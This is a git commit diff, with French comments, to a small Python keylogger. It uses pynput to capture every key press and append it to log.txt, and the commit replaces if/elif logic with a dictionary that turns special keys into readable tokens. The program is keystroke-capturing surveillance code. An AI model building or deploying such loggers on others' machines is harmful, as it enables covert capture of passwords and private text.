3bb746099716a7ec35bf16de4b844b9f05bc9238
SHACK! <143757022+GraphicShack@users.noreply.github.com>
2026-07-08 20:47:34 -0400

    Terminer base

--- Main.py
+++ Main.py
@@ -6,14 +6,58 @@ def ecrire_Au_Fichier(touche):
     Lettre = str(touche) #PROBLEME : sortie de base, si la touche est [A] la sortie sera 'A'
     Lettre = Lettre.replace("'", "") #FIX : Ajuster l'impression de la lettre pour remplacer les "'" par rien
 
-    if Lettre == 'Key.space':
-        Lettre = ' '
+    remplacements = {
+        "Key.space": " ",
+        "Key.enter": "\n",
+        "Key.tab": "\t",
 
-    elif Lettre == 'Key.enter':
-        Lettre = '\n'
+        "Key.backspace": "[BACKSPACE]",
+        "Key.delete": "[DELETE]",
+        "Key.esc": "[ESC]",
 
-    elif Lettre == 'Key.shift_r' or Lettre == 'Key.shift':
-        Lettre = ''
+        "Key.shift": "",
+        "Key.shift_l": "",
+        "Key.shift_r": "",
+
+        "Key.ctrl": "[CTRL]",
+        "Key.ctrl_l": "[CTRL]",
+        "Key.ctrl_r": "[CTRL]",
+
+        "Key.alt": "[ALT]",
+        "Key.alt_l": "[ALT]",
+        "Key.alt_r": "[ALT]",
+        "Key.alt_gr": "[ALT]",
+
+        "Key.caps_lock": "[CAPS_LOCK]",
+        "Key.cmd": "[CMD]",
+        "Key.cmd_l": "[CMD]",
+        "Key.cmd_r": "[CMD]",
+
+        "Key.up": "[UP]",
+        "Key.down": "[DOWN]",
+        "Key.left": "[LEFT]",
+        "Key.right": "[RIGHT]",
+
+        "Key.home": "[HOME]",
+        "Key.end": "[END]",
+        "Key.page_up": "[PAGE_UP]",
+        "Key.page_down": "[PAGE_DOWN]",
+
+        "Key.f1": "[F1]",
+        "Key.f2": "[F2]",
+        "Key.f3": "[F3]",
+        "Key.f4": "[F4]",
+        "Key.f5": "[F5]",
+        "Key.f6": "[F6]",
+        "Key.f7": "[F7]",
+        "Key.f8": "[F8]",
+        "Key.f9": "[F9]",
+        "Key.f10": "[F10]",
+        "Key.f11": "[F11]",
+        "Key.f12": "[F12]"
+    }
+
+    Lettre = remplacements.get(Lettre, Lettre)
 
     #Logique impression dans le fichier
     with open("log.txt", "a") as fichier:
@@ -21,5 +65,3 @@ def ecrire_Au_Fichier(touche):
 
 with Listener(on_press=ecrire_Au_Fichier) as L: # L est un listener
     L.join() #on append les données
-
-#Je suis le meilleur
